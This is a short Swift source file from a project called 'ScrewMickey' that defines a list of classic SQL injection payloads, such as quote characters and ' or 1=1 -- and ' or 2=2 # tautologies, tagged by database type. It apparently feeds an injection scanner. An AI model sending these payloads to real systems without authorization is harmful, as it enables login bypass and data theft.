//
//  SQLi.swift
//  ScrewMickey
//
//  Created by clement rabourdin on 12/01/2016.
//  Copyright © 2016 Syluaq DP Team. All rights reserved.
//

import Foundation

public var theSQLList = SQLi()

public struct SQLi {
    public enum DBType {
        case any
        case mySQL
        case others
    }
    
    public struct SingleSQLi {
        var typeDB : DBType
        var value : String
        
        init(type: DBType, val: String) {
            typeDB = type
            value = val
        }
    }
    
    public let listOfSQLi : [SingleSQLi] = [
        SingleSQLi(type: .any, val: "'"),
        SingleSQLi(type: .any, val: " or 1=1 "),
        SingleSQLi(type: .others, val: " or 1=1 --"),
        SingleSQLi(type: .mySQL, val: " or 1=1 #"),
        SingleSQLi(type: .any, val: "' or 1=1 "),
        SingleSQLi(type: .others, val: "' or 1=1 --"),
        SingleSQLi(type: .mySQL, val: "' or 1=1 #"),
        SingleSQLi(type: .any, val: " or 2=2 "),
        SingleSQLi(type: .others, val: " or 2=2 --"),
        SingleSQLi(type: .mySQL, val: " or 2=2 #"),
        SingleSQLi(type: .any, val: "' or 2=2 "),
        SingleSQLi(type: .others, val: "' or 2=2 --"),
        SingleSQLi(type: .mySQL, val: "' or 2=2 #")
    ]
    
}
